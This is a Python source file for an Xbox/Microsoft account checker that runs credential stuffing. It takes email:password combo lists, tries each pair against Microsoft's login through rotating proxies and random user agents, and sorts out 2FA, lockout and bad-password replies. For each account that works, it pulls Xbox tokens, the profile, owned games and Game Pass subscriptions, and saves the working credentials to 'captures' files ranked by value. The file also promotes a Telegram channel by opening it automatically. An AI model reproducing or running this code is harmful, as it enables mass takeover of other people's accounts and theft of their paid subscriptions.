
import os
import sys
import re
import json
import time
import random
import threading
import uuid
import shutil
import subprocess, webbrowser
from pathlib import Path
from datetime import datetime
from urllib.parse import urlencode, urljoin, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED


import requests, urllib3, pyfiglet
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.box import DOUBLE, HEAVY, ROUNDED, SQUARE, HEAVY_EDGE, MINIMAL
from rich.table import Table
from rich.text import Text
from rich.rule import Rule

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
CONSOLE = Console()

# ─────────────────────────── identity ────────────────────────

APP_NAME     = "Xbox - FullCap"
APP_SUB      = "account state · subscription inventory"
AUTHOR       = "mehydo"
CHANNEL_URL  = "https://t.me/sadikmahedi88"
CHANNEL_TAG  = "t.me/someshitabro"
BUILD_TAG    = "build 4"

# teal / coral palette — distinct from prior magenta/amber drafts
TEAL         = "turquoise2"
TEAL_DIM     = "dark_cyan"
CORAL        = "orange1"
CORAL_DIM    = "dark_orange"
MINT         = "spring_green2"
MUTED        = "grey54"
ERR          = "red1"

ORNA_HDR     = "◈  ▬  ◭  ▬  ◈"
ORNA_FTR     = "▫  ▸  ◆  ▸  ▫"

STATUS_COLOR = {
    "premium": MINT,
    "hit":     CORAL,
    "free":    TEAL,
    "no_xbox": MUTED,
    "bad":     MUTED,
    "error":   ERR,
}

STATUS_BOX = {
    "premium": ROUNDED,
    "hit":     HEAVY_EDGE,
    "free":    MINIMAL,
    "no_xbox": SQUARE,
    "bad":     SQUARE,
    "error":   SQUARE,
}

STATUS_GLYPH = {
    "premium": "◆",
    "hit":     "◇",
    "free":    "▸",
    "no_xbox": "▫",
    "bad":     "○",
    "error":   "×",
}

STATUS_LABEL = {
    "premium": "SUBSCRIBED",
    "hit":     "OWNED",
    "free":    "BLANK",
    "no_xbox": "NO-PROFILE",
    "bad":     "DENIED",
    "error":   "FAULT",
}

# ─────────────────────────── constants ───────────────────────

SKUS = {
    "CFQ7TTC0KHS0": "Game Pass Ultimate",
    "CFQ7TTC0P85B": "Game Pass Core",
    "CFQ7TTC0KGQ8": "PC Game Pass",
    "CFQ7TTC0LFLZ": "EA Play",
    "CFQ7TTC0K5DK": "Xbox Live Gold",
    "CFQ7TTC0K6L8": "Game Pass Console",
    "9NKS9M6NGVSX": "Game Pass Ultimate",
    "9P6F9C1BRBRN": "Game Pass Core",
    "9NKX70PB5XF0": "PC Game Pass",
    "9NTL0K154WQN": "EA Play",
    "9P2N4TVL1Z9D": "Game Pass Standard",
    "9NS8BM8Z7NJP": "Game Pass Premium",
    "9MZ8KHLZ6VN4": "Game Pass Ultimate (PC)",
    "9MXDHTTS7K5Z": "Game Pass Core",
}

SUBSCRIPTION_KEYWORDS = (
    "game pass", "gold", "ea play", "xbox live", "pc game pass",
    "ultimate", "core", "console", "premium", "standard", "subscription",
)

SUBSCRIPTION_PREFIXES = ("CFQ7TTC0", "9NK", "9P6", "9NT", "9P2", "9MZ", "9MX", "9NS")

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

CHALLENGE_MAP = (
    ("tried to sign in too many times", "too_many_attempts"),
    ("too many attempts", "too_many_attempts"),
    ("account has been locked", "account_locked"),
    ("account is temporarily blocked", "temporarily_blocked"),
    ("we have temporarily blocked", "temporarily_blocked"),
    ("this account has been suspended", "suspended"),
    ("verify your identity", "2fa_required"),
    ("two-step verification", "2fa_required"),
    ("authenticator app", "2fa_required"),
    ("unusual activity", "2fa_required"),
    ("enter the code", "2fa_required"),
    ("your password is incorrect", "bad_password"),
    ("password is incorrect", "bad_password"),
    ("account doesn't exist", "no_account"),
    ("recover your account", "recovery_required"),
    ("help us protect", "2fa_required"),
)

COMFORMA = re.compile(r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)", re.I)

CLIENT_ID    = "0000000048093EE3"
REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
SCOPE        = "service::user.auth.xboxlive.com::MBI_SSL"

# ─────────────────────────── state ───────────────────────────

STATE_LOCK = threading.Lock()
WRITE_LOCK = threading.Lock()
PROXY_LOCK = threading.Lock()
STOP       = threading.Event()

STATS = {"checked": 0, "premium": 0, "hit": 0, "free": 0,
         "no_xbox": 0, "bad": 0, "error": 0, "rl": 0, "subs_total": 0}

CONFIG = {
    "threads": 8,
    "timeout": 30,
    "retries": 2,
    "proxies_file": "proxies.txt",
    "max_games": 10,
    "max_subs": 8,
    "redirect": True,
}

PROXIES      = []
PROXY_DEAD   = set()
PROXY_COOL   = {}
PROXY_BUSY   = set()
RATE_UNTIL   = [0.0]
RESULT_DIR   = None
FILE_HANDLES = {}

# ─────────────────────────── helpers ─────────────────────────

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def is_termux():
    prefix = os.environ.get("PREFIX", "")
    return (
        "com.termux" in prefix
        or os.environ.get("TERMUX_VERSION") is not None
        or os.path.isdir("/data/data/com.termux")
    )

def mk_session(proxy=None):
    s = requests.Session(); s.verify = False
    s.headers.update({
        "user-agent": random.choice(UAS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def safe(v):
    return "N/A" if v is None or v == "" else str(v)

def fmt_games(games, max_show):
    if not games: return "None"
    lines = [f"{i}. {g['name']}" + (" [GP]" if g.get("premium") else "") +
             f" | {g.get('score', 0)}G"
             for i, g in enumerate(games, 1)]
    if max_show and max_show < len(lines):
        return " | ".join(lines[:max_show]) + f" | +{len(lines) - max_show} more"
    return " | ".join(lines)

def fmt_subs(subs, max_show=8):
    if not subs: return "none"
    parts = []
    for s in subs[:max_show]:
        g = "◆" if s.get("active") else "◇"
        exp = (s.get("expires") or "")[:10]
        tag = f" [{exp}]" if exp else ""
        parts.append(f"{g} {s.get('name','?')}{tag}")
    if len(subs) > max_show:
        parts.append(f"+{len(subs) - max_show} more")
    return "  ·  ".join(parts)

# ─────────────────────────── redirect ────────────────────────

def _run_detached(cmd):
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
        return True
    except Exception:
        return False

def open_channel_redirect(url=CHANNEL_URL):
    methods = []
    if is_termux():
        methods += [
            ("termux-open-url", ["termux-open-url", url]),
            ("termux-open",     ["termux-open", url]),
            ("am-flag",  ["am", "start", "-f", "0x10000000",
                          "-a", "android.intent.action.VIEW", "-d", url]),
            ("am-user0", ["am", "start", "--user", "0", "-f", "0x10000000",
                          "-a", "android.intent.action.VIEW", "-d", url]),
        ]
    if os.name == "nt":
        methods.append(("start", ["cmd", "/c", "start", "", url]))
    else:
        methods += [("xdg-open", ["xdg-open", url]),
                    ("open", ["open", url]),
                    ("sensible-browser", ["sensible-browser", url])]
    for name, cmd in methods:
        if shutil.which(cmd[0]) and _run_detached(cmd):
            return True, name
    try:
        if webbrowser.open(url): return True, "webbrowser"
    except Exception: pass
    return False, None

def trigger_redirect():
    ok, method = open_channel_redirect()
    if ok: return
    CONSOLE.print()
    CONSOLE.print(Panel(
        Text.from_markup(
            f"[{CORAL}]▸ channel link[/{CORAL}]\n\n"
            f"    [bright_white]{CHANNEL_URL}[/bright_white]\n\n"
            f"[{MUTED}]open manually, or press [r] in the menu to retry.[/{MUTED}]"
        ),
        border_style=CORAL_DIM, box=ROUNDED, padding=(1, 3),
    ))
    CONSOLE.print()

# ─────────────────────────── banner ──────────────────────────

def paint_banner():
    clear_screen()
    try:
        cols = shutil.get_terminal_size(fallback=(80, 24)).columns
    except Exception:
        cols = 80
    panel_w = min(cols - 2, 96)

    art = None
    for font in ("doom", "ogre", "isometric1", "big", "small", "standard"):
        try:
            art = pyfiglet.figlet_format("XBL", font=font,
                                          width=panel_w - 8).rstrip("\n").split("\n")
            break
        except Exception:
            continue
    if not art:
        art = [APP_NAME]

    palette = [TEAL, TEAL_DIM, CORAL, MINT]
    head = Text()
    head.append("\n" + ORNA_HDR.center(panel_w - 8) + "\n\n", style=MUTED)
    for i, ln in enumerate(art):
        head.append(ln.center(panel_w - 8) + "\n", style=palette[i % len(palette)])
    head.append("\n" + ORNA_FTR.center(panel_w - 8) + "\n\n", style=MUTED)
    head.append(APP_SUB.center(panel_w - 8) + "\n", style="bright_white")
    head.append(f"{BUILD_TAG}  ·  {CHANNEL_TAG}".center(panel_w - 8) + "\n", style=CORAL_DIM)

    CONSOLE.print(Panel(
        Align.center(head),
        border_style=TEAL_DIM, box=DOUBLE,
        padding=(1, 3), width=panel_w,
    ))
    CONSOLE.print()

def section(title):
    CONSOLE.print()
    CONSOLE.print(Rule(f"[{CORAL}]◈  {title}  ◈[/{CORAL}]", style=TEAL_DIM))
    CONSOLE.print()

def ask(prompt):
    try:
        CONSOLE.print(f"[{TEAL}]▸[/{TEAL}] [bright_white]{prompt}[/bright_white] : ", end="")
        return input().strip()
    except (KeyboardInterrupt, EOFError):
        CONSOLE.print(); raise

def kv_panel(title, pairs, box=ROUNDED, color=TEAL_DIM):
    grid = Table(show_header=False, box=None, width=90, padding=(0, 1))
    grid.add_column(justify="left", style=TEAL, no_wrap=True, width=16)
    grid.add_column(justify="left", style="bright_white", overflow="fold")
    for k, v in pairs:
        grid.add_row(str(k), str(v))
    return Panel(
        grid, title=title, title_align="left",
        subtitle=f"· {CHANNEL_TAG} ·", subtitle_align="right",
        box=box, border_style=color, width=96, padding=(1, 2),
    )

# ─────────────────────────── microsoft auth ──────────────────

def extract_ppft(html):
    if not html: return None
    m = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
    if m: return m.group(1)
    m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html)
    if m: return m.group(1)
    m = re.search(r'"sFTTag"\s*:\s*"(.*?)"\s*,\s*"', html, re.DOTALL)
    if m:
        pm = re.search(r'value=\\"([^\\"]+)\\"', m.group(1))
        if pm: return pm.group(1)
    return None

def extract_url_post(html):
    if not html: return None
    m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
    if m: return m.group(1).replace("\\u0026", "&").replace("\\/", "/")
    return None

def find_challenge(text):
    if not text: return None
    t = text.lower()
    for pat, tag in CHALLENGE_MAP:
        if pat in t: return tag
    return None

def extract_token_from_url(url):
    if not url or "#access_token=" not in url: return None
    frag = url.split("#", 1)[1]
    tokens = parse_qs(frag).get("access_token")
    return tokens[0] if tokens else None

def map_reason(raw):
    r = str(raw).lower()
    if "password" in r: return "bad_password"
    if any(x in r for x in ("notexist", "not_exist", "noaccount", "doesn't exist")): return "no_account"
    if any(x in r for x in ("toomany", "attempt")): return "too_many_attempts"
    if "locked" in r: return "account_locked"
    if "blocked" in r: return "temporarily_blocked"
    if any(x in r for x in ("verify", "proof")): return "2fa_required"
    return "auth_fail"

def microsoft_login(session, email, password):
    params = {"client_id": CLIENT_ID, "redirect_uri": REDIRECT_URI,
              "response_type": "token", "scope": SCOPE,
              "display": "touch", "locale": "en"}
    auth_url = "https://login.live.com/oauth20_authorize.srf?" + urlencode(params)

    try:
        r = session.get(auth_url, allow_redirects=True, timeout=25)
    except Exception as e:
        return None, f"net:{type(e).__name__}"
    if r.status_code == 429: return None, "rate_limited"

    ppft = extract_ppft(r.text)
    url_post = extract_url_post(r.text)
    if not ppft or not url_post:
        if "oauth20_desktop" in r.url:
            tok = extract_token_from_url(r.url)
            if tok: return tok, None
        return None, "no_ppft"

    vanguard = ""
    try:
        cp = session.post(
            "https://login.live.com/checkpassword.srf",
            json={"username": email, "password": password, "checkpasswordflowtoken": ""},
            headers={"accept": "application/json",
                     "content-type": "application/json; charset=utf-8",
                     "origin": "https://login.live.com", "referer": auth_url,
                     "client-request-id": str(uuid.uuid4()),
                     "hpgid": "2004", "hpgact": "0"},
            timeout=20)
        if cp.status_code == 200:
            try:
                j = cp.json()
                if j.get("validationresult") == "succeed":
                    vanguard = j.get("vanguardflowtoken", "") or ""
                else:
                    detail = j.get("validationdetail") or {}
                    reason = detail.get("error", "bad_password") if isinstance(detail, dict) else "bad_password"
                    return None, map_reason(reason)
            except Exception: pass
    except Exception: pass

    form = {"ps": "2", "PPFT": ppft, "PPSX": "Pass", "NewUser": "1",
            "FoundMSAs": "", "fspost": "0", "i21": "0", "CookieDisclosure": "0",
            "IsFidoSupported": "1", "isSignupPost": "0", "isRecoveryAttemptPost": "0",
            "i13": "0", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "3", "cpr": "0", "passwd": password,
            "vanguardflowtoken": vanguard}

    try:
        r2 = session.post(url_post, data=form,
            headers={"content-type": "application/x-www-form-urlencoded",
                     "origin": "https://login.live.com", "referer": auth_url},
            allow_redirects=False, timeout=25)
    except Exception as e:
        return None, f"submit:{type(e).__name__}"
    if r2.status_code == 429: return None, "rate_limited"

    cur = r2
    for _ in range(15):
        loc = cur.headers.get("Location", "") if hasattr(cur, "headers") else ""
        if loc:
            tok = extract_token_from_url(loc)
            if tok: return tok, None
            nxt = urljoin(cur.url or url_post, loc)
            low = nxt.lower()
            if "account.live.com/recover" in low: return None, "recovery_required"
            if "account.live.com/abuse" in low: return None, "suspended"
            if any(x in low for x in ("/interrupt/", "fido", "proofup")):
                return None, "2fa_required"
            try: cur = session.get(nxt, allow_redirects=False, timeout=25)
            except Exception: break
            continue
        body = cur.text if hasattr(cur, "text") else ""
        tag = find_challenge(body)
        if tag: return None, tag
        cur_url = cur.url if hasattr(cur, "url") else ""
        tok = extract_token_from_url(cur_url)
        if tok: return tok, None
        break

    body = cur.text if hasattr(cur, "text") else ""
    tag = find_challenge(body)
    if tag: return None, tag
    return None, "no_token"

# ─────────────────────────── xbox chain ──────────────────────

def xbl_authenticate(access_token):
    try:
        r = requests.post(
            "https://user.auth.xboxlive.com/user/authenticate",
            json={"Properties": {"AuthMethod": "RPS",
                                 "SiteName": "user.auth.xboxlive.com",
                                 "RpsTicket": f"d={access_token}"},
                  "RelyingParty": "http://auth.xboxlive.com",
                  "TokenType": "JWT"},
            headers={"x-xbl-contract-version": "1", "Content-Type": "application/json"},
            timeout=25, verify=False)
        j = r.json()
        token = j.get("Token")
        if not token: return None, "xbl_no_token"
        return token, None
    except Exception as e:
        return None, f"xbl_net:{type(e).__name__}"

def xsts_authorize(xbl_token, rp="http://xboxlive.com"):
    try:
        r = requests.post(
            "https://xsts.auth.xboxlive.com/xsts/authorize",
            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                  "RelyingParty": rp, "TokenType": "JWT"},
            headers={"x-xbl-contract-version": "1", "Content-Type": "application/json"},
            timeout=25, verify=False)
        try: j = r.json()
        except Exception: return None, f"xsts_non_json:{r.status_code}"

        xerr = j.get("XErr")
        if xerr:
            err_map = {2148916227: "banned", 2148916233: "no_xbox",
                       2148916235: "region_banned", 2148916236: "adult_verification",
                       2148916237: "adult_verification", 2148916238: "child_account"}
            return None, f"xsts:{err_map.get(xerr, f'unknown_{xerr}')}"
        if r.status_code != 200: return None, f"xsts_http:{r.status_code}"

        token = j.get("Token")
        claims = ((j.get("DisplayClaims") or {}).get("xui") or [{}])[0]
        uhs = claims.get("uhs")
        if not token or not uhs: return None, "xsts_no_token"

        return {"token": token, "uhs": uhs,
                "xuid": claims.get("xid"), "gtg": claims.get("gtg"),
                "agg": claims.get("agg"),
                "auth": f"XBL3.0 x={uhs};{token}"}, None
    except Exception as e:
        return None, f"xsts_net:{type(e).__name__}"

def fetch_profile(auth, xuid):
    settings = ("Gamertag,GameDisplayPicRaw,Gamerscore,AccountTier,XboxOneRep,"
                "RealName,Bio,TenureLevel,Location,ModernGamertag,"
                "ModernGamertagSuffix,UniqueModernGamertag,PreferredColor")
    try:
        r = requests.get(
            f"https://profile.xboxlive.com/users/xuid({xuid})/profile/settings?settings={settings}",
            headers={"Authorization": auth, "x-xbl-contract-version": "3"},
            timeout=25, verify=False)
        if r.status_code != 200: return {}
        j = r.json(); out = {}
        for u in j.get("profileUsers") or []:
            for s in u.get("settings") or []:
                out[s.get("id")] = s.get("value")
        return out
    except Exception: return {}

def fetch_titles(auth, xuid):
    try:
        r = requests.get(
            f"https://titlehub.xboxlive.com/users/xuid({xuid})"
            f"/titles/titlehistory/decoration/Achievement,Image,Detail,Scid,GamePass",
            headers={"Authorization": auth, "x-xbl-contract-version": "2",
                     "Accept-Language": "en-US"},
            timeout=30, verify=False)
        if r.status_code != 200: return []
        return r.json().get("titles") or []
    except Exception: return []

# ─────────────────────────── subscriptions ───────────────────

def fetch_entitlements(auth):
    """Full entitlement list from accounts.xboxlive.com — subscriptions included."""
    out = []
    try:
        r = requests.get(
            "https://accounts.xboxlive.com/users/me/entitlements",
            headers={"Authorization": auth, "x-xbl-contract-version": "2",
                     "Accept": "application/json", "Accept-Language": "en-US"},
            timeout=25, verify=False)
        if r.status_code != 200: return out
        j = r.json()
        for e in j.get("entitlements") or []:
            out.append({
                "product_id": e.get("ProductId"),
                "name":       e.get("Name") or "",
                "active":     bool(e.get("Active")),
                "expiration": e.get("Expiration") or "",
                "satisfied":  e.get("SatisfiedByProductIds") or [],
                "kind":       e.get("EntitlementType") or e.get("Type") or "",
            })
    except Exception:
        pass
    return out

def resolve_product_meta(product_ids):
    """Resolve product names + FulfillmentType via displaycatalog."""
    if not product_ids: return {}
    ids = list({p for p in product_ids if p})
    out = {}
    for chunk in [ids[i:i+20] for i in range(0, len(ids), 20)]:
        try:
            r = requests.get(
                "https://displaycatalog.mp.microsoft.com/v7.0/products",
                params={"bigIds": ",".join(chunk), "market": "US",
                        "languages": "en-US", "fieldsTemplate": "Details"},
                headers={"MS-CV": f"{uuid.uuid4().hex}.0",
                         "Accept": "application/json"},
                timeout=25, verify=False)
            if r.status_code != 200: continue
            for prod in r.json().get("Products") or []:
                pid = prod.get("ProductId")
                title, fulfillment = "", ""
                for lp in prod.get("LocalizedProperties") or []:
                    if lp.get("ProductTitle"):
                        title = lp["ProductTitle"]; break
                for dsa in prod.get("DisplaySkuAvailabilities") or []:
                    sku = dsa.get("Sku") or {}
                    props = sku.get("Properties") or {}
                    ft = props.get("FulfillmentType") or ""
                    if ft: fulfillment = ft; break
                out[pid] = {"name": title, "fulfillment": fulfillment}
        except Exception:
            continue
    return out

def fetch_gamepass_catalog(mp_auth):
    """Cross-check via gamepass catalog — returns product IDs the account owns."""
    if not mp_auth: return []
    try:
        r = requests.post(
            "https://catalog.gamepass.com/v3/products?market=US&language=en-US&hydration=RemoteHighUserTitanite0",
            json={"Products": list(SKUS.keys())},
            headers={"content-type": "application/json",
                     "x-store-authorization": mp_auth,
                     "calling-app-name": "Xbox Cloud Gaming Web",
                     "calling-app-version": "29.20.10"},
            timeout=25, verify=False)
        if r.status_code != 200: return []
        products = r.json().get("Products") or {}
        return [sku for sku, info in products.items() if info.get("HasPurchased")]
    except Exception:
        return []

def is_subscription(entry, meta):
    pid  = (entry.get("product_id") or "").upper()
    name = (entry.get("name") or "").lower()
    fulfillment = (meta.get("fulfillment") or "").lower()
    if fulfillment == "subscription": return True
    if pid in SKUS: return True
    if any(pid.startswith(p) for p in SUBSCRIPTION_PREFIXES): return True
    if any(k in name for k in SUBSCRIPTION_KEYWORDS): return True
    return False

def collect_subscriptions(auth, mp_auth):
    """
    Aggregate every subscription signal into a single normalized list.
    Returns (subs_list, all_entitlements_count, sources_used).
    """
    entitlements = fetch_entitlements(auth)
    gp_owned     = fetch_gamepass_catalog(mp_auth)

    all_ids = []
    for e in entitlements:
        if e.get("product_id"): all_ids.append(e["product_id"])
        for s in e.get("satisfied") or []:
            if s: all_ids.append(s)
    all_ids.extend(gp_owned)
    all_ids.extend(SKUS.keys())

    meta = resolve_product_meta(all_ids)

    subs = []
    seen = set()

    # source 1: entitlements
    for e in entitlements:
        m = meta.get(e.get("product_id"), {})
        if not is_subscription(e, m):
            continue
        pid = e.get("product_id") or ""
        if pid in seen: continue
        seen.add(pid)
        name = m.get("name") or e.get("name") or SKUS.get(pid, pid)
        subs.append({
            "product_id": pid,
            "name":       name,
            "active":     e.get("active", False),
            "expires":    e.get("expiration") or "",
            "source":     "entitlements",
        })

    # source 2: gamepass catalog
    for pid in gp_owned:
        if pid in seen: continue
        seen.add(pid)
        m = meta.get(pid, {})
        name = m.get("name") or SKUS.get(pid, pid)
        subs.append({
            "product_id": pid,
            "name":       name,
            "active":     True,
            "expires":    "",
            "source":     "catalog",
        })

    # sort: active first, then by name
    subs.sort(key=lambda s: (not s.get("active"), s.get("name", "").lower()))
    active_count = sum(1 for s in subs if s.get("active"))
    return subs, len(entitlements), active_count

# ─────────────────────────── audit ───────────────────────────

def audit_combo(combo, proxy=None):
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()

    try:
        session = mk_session(proxy)
        token, err = microsoft_login(session, email, password)
        if err:
            if err == "rate_limited":
                return {"status": "error", "reason": err, "email": email, "rl": True}
            if err == "no_xbox":
                return {"status": "no_xbox", "email": email}
            if err in ("2fa_required", "account_locked", "too_many_attempts",
                       "temporarily_blocked", "suspended", "recovery_required",
                       "bad_password", "no_account", "auth_fail"):
                return {"status": "bad", "reason": err, "email": email}
            return {"status": "error", "reason": err, "email": email}

        xbl, err = xbl_authenticate(token)
        if err: return {"status": "error", "reason": err, "email": email}

        xsts, err = xsts_authorize(xbl)
        if err:
            if "no_xbox" in (err or ""): return {"status": "no_xbox", "email": email}
            return {"status": "bad", "reason": err, "email": email}

        xuid = xsts["xuid"]; auth = xsts["auth"]
        mp, _ = xsts_authorize(xbl, "http://mp.microsoft.com/")
        mp_auth = mp["auth"] if mp else None

        profile = fetch_profile(auth, xuid)
        titles  = fetch_titles(auth, xuid)

        subs, ent_count, active_subs = collect_subscriptions(auth, mp_auth)

        games = []
        for t in titles:
            if (t.get("type") or "").lower() == "app": continue
            gs = 0
            ach = t.get("achievement") or {}
            if isinstance(ach, dict):
                try: gs = int(ach.get("currentGamerscore", 0) or 0)
                except Exception: gs = 0
            games.append({"name": t.get("name") or "", "score": gs,
                          "premium": bool((t.get("gamePass") or {}).get("isGamePass"))})

        premium_games = [g for g in games if g["premium"]]
        if active_subs > 0 or premium_games:
            verdict = "premium"
        elif games:
            verdict = "hit"
        else:
            verdict = "free"

        return {"status": "ok", "verdict": verdict,
                "email": email, "password": password, "xuid": xuid,
                "gamertag": profile.get("Gamertag") or xsts.get("gtg") or "",
                "gamerscore": profile.get("Gamerscore") or "0",
                "tenure": profile.get("TenureLevel") or "0",
                "tier": (profile.get("AccountTier") or "").strip(),
                "reputation": profile.get("XboxOneRep") or "",
                "location": profile.get("Location") or "",
                "games": games, "games_count": len(games),
                "premium_count": len(premium_games),
                "subs": subs, "subs_count": len(subs),
                "active_subs": active_subs,
                "entitlement_count": ent_count,
                "has_minecraft": any("minecraft" in g["name"].lower() for g in games)}
    except Exception as e:
        return {"status": "error", "reason": f"crash:{type(e).__name__}", "email": email}

# ─────────────────────────── display ─────────────────────────

def display_hit(result, done, total):
    verdict = result["verdict"]
    color   = STATUS_COLOR.get(verdict, "bright_white")
    box     = STATUS_BOX.get(verdict, ROUNDED)
    label   = STATUS_LABEL.get(verdict, verdict.upper())
    glyph   = STATUS_GLYPH.get(verdict, "·")

    subs = result.get("subs") or []
    active_subs = [s for s in subs if s.get("active")]

    pairs = [
        ("email",      safe(result.get("email"))),
        ("password",   safe(result.get("password"))),
        ("xuid",       safe(result.get("xuid"))),
        ("gamertag",   safe(result.get("gamertag"))),
        ("gamerscore", safe(result.get("gamerscore"))),
        ("tenure",     safe(result.get("tenure"))),
        ("tier",       safe(result.get("tier")) or "Silver"),
        ("location",   safe(result.get("location"))),
        ("titles",     safe(result.get("games_count"))),
        ("premium",    safe(result.get("premium_count"))),
        ("subs",       f"{result.get('active_subs', 0)} active / {result.get('subs_count', 0)} total"),
        ("minecraft",  "yes" if result.get("has_minecraft") else "no"),
    ]

    if subs:
        pairs.append(("subscriptions", fmt_subs(subs, CONFIG["max_subs"])))

    games_str = fmt_games(result.get("games") or [], CONFIG["max_games"])
    if games_str and games_str != "None":
        pairs.append(("titles list", games_str[:170]))

    title = (f"[{MUTED}]{done:03d}/{total:03d}[/{MUTED}]  "
             f"[{color}]{glyph} {label}[/{color}]")
    with WRITE_LOCK:
        CONSOLE.print()
        CONSOLE.print(kv_panel(title, pairs, box=box, color=color))
        CONSOLE.print()

def display_low(result, done, total, kind):
    if kind == "no_xbox": color, box = MUTED, SQUARE
    elif kind == "bad":   color, box = MUTED, SQUARE
    else:                 color, box = ERR, SQUARE
    glyph = STATUS_GLYPH.get(kind, "·")
    pairs = [("email",  safe(result.get("email"))),
             ("reason", safe(result.get("reason")) if kind != "no_xbox" else "no_profile")]
    label = STATUS_LABEL.get(kind, kind.upper())
    title = (f"[{MUTED}]{done:03d}/{total:03d}[/{MUTED}]  "
             f"[{color}]{glyph} {label}[/{color}]")
    with WRITE_LOCK:
        CONSOLE.print()
        CONSOLE.print(kv_panel(title, pairs, box=box, color=color))
        CONSOLE.print()

# ─────────────────────────── results io ──────────────────────

def result_dir():
    global RESULT_DIR
    if RESULT_DIR: return RESULT_DIR
    root = Path.cwd() / "captures"
    root.mkdir(parents=True, exist_ok=True)
    RESULT_DIR = str(root)
    return RESULT_DIR

def open_result_files():
    names = ["subscribed.txt", "owned.txt", "blank.txt",
             "no_profile.txt", "denied.txt", "faults.txt"]
    handles = []
    try:
        for n in names:
            handles.append(open(os.path.join(result_dir(), n), "w", encoding="utf-8"))
    except Exception:
        for h in handles:
            try: h.close()
            except Exception: pass
        raise
    header = (f"# suite {BUILD_TAG} · @{AUTHOR} · {CHANNEL_TAG}\n"
              f"# generated {datetime.now().isoformat()}\n\n")
    for h in handles: h.write(header)
    FILE_HANDLES.update(dict(zip(
        ["premium", "hit", "free", "no_xbox", "bad", "error"], handles)))

def write_result(result, verdict):
    lp = f"{result.get('email')}:{result.get('password')}"
    if verdict == "premium":
        subs = result.get("subs") or []
        sub_parts = []
        for s in subs:
            g = "A" if s.get("active") else "E"
            exp = (s.get("expires") or "")[:10]
            sub_parts.append(f"{s.get('name','?')}[{g}{',' + exp if exp else ''}]")
        parts = [f"xuid={result.get('xuid','-')}",
                 f"tag={result.get('gamertag','-')}",
                 f"gs={result.get('gamerscore','0')}",
                 f"titles={result.get('games_count',0)}",
                 f"subs={len(subs)}"]
        line = f"[SUBSCRIBED] {lp} | " + " | ".join(parts) + f" | by @{AUTHOR}\n"
        line += f"subscriptions: {' | '.join(sub_parts) or 'none'}\n"
        line += f"titles: {fmt_games(result.get('games') or [], CONFIG['max_games'])}\n\n"
        fh = FILE_HANDLES.get("premium")
    elif verdict == "hit":
        parts = [f"xuid={result.get('xuid','-')}",
                 f"tag={result.get('gamertag','-')}",
                 f"gs={result.get('gamerscore','0')}",
                 f"titles={result.get('games_count',0)}"]
        line = f"[OWNED] {lp} | " + " | ".join(parts) + f" | by @{AUTHOR}\n"
        line += f"titles: {fmt_games(result.get('games') or [], CONFIG['max_games'])}\n\n"
        fh = FILE_HANDLES.get("hit")
    elif verdict == "free":
        line = (f"[BLANK] {lp} | xuid={result.get('xuid','-')} | "
                f"tag={result.get('gamertag','-')} | by @{AUTHOR}\n\n")
        fh = FILE_HANDLES.get("free")
    elif verdict == "no_xbox":
        line = f"{lp} | no_profile | by @{AUTHOR}\n"
        fh = FILE_HANDLES.get("no_xbox")
    elif verdict == "bad":
        line = f"{lp} | {result.get('reason','invalid')} | by @{AUTHOR}\n"
        fh = FILE_HANDLES.get("bad")
    else:
        line = f"{lp} | {result.get('reason','unknown')} | by @{AUTHOR}\n"
        fh = FILE_HANDLES.get("error")
    if fh:
        try:
            with WRITE_LOCK:
                fh.write(line); fh.flush()
        except Exception: pass

# ─────────────────────────── stats ───────────────────────────

def record(result, total):
    st = result.get("status")
    with STATE_LOCK:
        STATS["checked"] += 1
        done = STATS["checked"]
        if st == "ok":
            verdict = result.get("verdict", "free")
            STATS[verdict] = STATS.get(verdict, 0) + 1
            if verdict == "premium":
                STATS["subs_total"] += result.get("active_subs", 0)
        elif st == "no_xbox":
            verdict = "no_xbox"; STATS["no_xbox"] += 1
        elif st == "bad":
            verdict = "bad"; STATS["bad"] += 1
        else:
            verdict = "error"; STATS["error"] += 1
            if result.get("rl"): STATS["rl"] += 1

    if st == "ok":
        display_hit(result, done, total)
    else:
        display_low(result, done, total, verdict)
    write_result(result, verdict)

# ─────────────────────────── proxies ─────────────────────────

def parse_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")): return line
    parts = line.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    if "@" in line: return f"http://{line}"
    return None

def load_proxies(path):
    if not path or not os.path.isfile(path): return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = parse_proxy(ln)
            if p: out.append(p)
    return list(dict.fromkeys(out))

def probe_proxy(p):
    try:
        return mk_session(p).get("https://api.ipify.org?format=json", timeout=8).status_code == 200
    except Exception:
        return False

